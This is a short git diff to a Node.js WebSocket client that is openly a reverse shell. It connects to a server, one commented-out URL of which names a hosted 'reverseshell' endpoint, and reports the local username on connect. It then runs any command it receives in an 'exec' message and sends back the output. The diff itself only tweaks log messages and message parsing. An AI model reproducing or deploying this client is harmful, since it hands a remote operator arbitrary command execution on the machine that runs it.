@@ -3,15 +3,15 @@ var WebSocket = require('ws');
 var ws = new WebSocket('ws://192.168.0.240:8080');
 //var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
 ws.on('open', () => {
-    console.log("> Websocket connection opened.")
+    console.log("> Websocket connection established.")
     ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username }))
 });
 ws.on('message', function(msg) {
-  msg = JSON.parse(msg.data)
-  console.log("Server >", msg.value)
+  console.log("Received >", msg.toString())
+  msg = JSON.parse(msg.toString())
   switch(msg.type){
     case "msg":
-      console.log(">", msg)
+      console.log(">", msg.value)
       break;
     case "exec":
       exec(msg.value, (error, stdout, stderr) => {
@@ -36,6 +36,7 @@ ws.on("upgrade", (data) => {
 })
 ws.on("close", (data) => {
   console.log("> Connection closed.", data)
+  console.log("Aborting..")
 })
 //ws.ping()
 ws.on("error", (err) => {
